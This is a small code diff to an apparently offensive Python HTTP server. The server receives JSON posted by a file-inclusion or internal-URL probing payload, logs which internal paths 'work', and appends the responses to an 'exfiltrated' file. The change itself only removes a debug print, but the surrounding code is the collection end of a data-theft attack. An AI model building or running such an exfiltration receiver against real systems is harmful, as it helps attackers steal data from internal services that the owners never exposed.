@@ -48,11 +48,11 @@ class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
         try:
             # Parse the JSON data
             json_data = json.loads(post_data)
-            print("Received JSON data:")
             #print(json.dumps(json_data, indent=4))  # Pretty-print the JSON data
             
             res : str = json_data["internal_api_res"]
             internal_lfi_path =  json_data["payload_url"]
+            
             if not ("Not Found".lower() in res.lower()):
                 print("[+] payload works => internal url: " + internal_lfi_path)
                 with open('exfiltrated/current_internal_response.txt', 'ab') as f:
